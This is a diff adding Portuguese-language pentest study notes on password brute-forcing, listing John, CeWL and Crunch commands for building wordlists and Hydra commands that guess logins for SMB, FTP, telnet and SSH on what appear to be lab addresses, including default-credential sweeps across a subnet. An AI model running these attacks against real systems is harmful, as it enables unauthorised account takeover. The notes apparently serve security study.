@@ -2,3 +2,67 @@
                         Brute-Force - Ataque a senhas
 ================================================================================
 
+================================================================================
+                            Mutação em wordlists
+================================================================================
+
+Utilizando o John:
+
+    john --wordlist=minha_wordlist.txt --rules --stdout > mutacao.txt
+
+================================================================================
+                           Wordlist Personalizadas
+================================================================================
+
+Gerar lista de palavras com base no site
+
+    cewl www.businesscorp.com.br -m 7 -w palavras.txt
+
+Gerador de wordlists CRUNCH
+
+    % -> dígitos
+    ^ -> caracteres especiais
+    @ -> caracteres minúsculos
+    , -> caracteres maiúsculos
+
+    Exemplos:
+
+        crunch 10 10 -t rogerio^%% -o wordlist.txt
+        crunch 14 14 -t Gbusiness^^%%% -o wordlist.txt
+        crunch 4 4 0123456789 -o pin.txt
+        crunch 6 6 -f charset.lst numeric -o pin.txt
+
+================================================================================
+                        Key Space Brute Force
+================================================================================
+
+O tipo de brute force que vai esgotar todas as possibilidades até encontrar a
+senha. Muito útil quando o padrão utilizado é identificado.
+
+================================================================================
+                        Brute force com Hydra
+================================================================================
+
+
+    hydra -v -l rogerio -P senhas.txt 172.16.1.60 smb
+    hydra -v -L users.txt -P senhas.txt 172.16.1.4 ftp
+    hydra -v -L users.txt -P senhas.txt 172.16.1.5 telnet -t 1 -W 5
+
+================================================================================
+                        Reverse Brute Force
+================================================================================
+
+Realiza o ataque de força bruta no login e não na senha.
+
+    hydra -v -L users.txt -p admin 172.16.1.5 ssh
+
+================================================================================
+                            Low Hanging Fruit
+================================================================================
+
+Buscar os pontos mais fracos e fáceis (Ex: credenciais default)
+
+    Exemplos:
+
+        hydra -v -l root -p root 172.16.1.0/24 ssh
+        hydra -v -l root -p root -M hosts.txt ssh
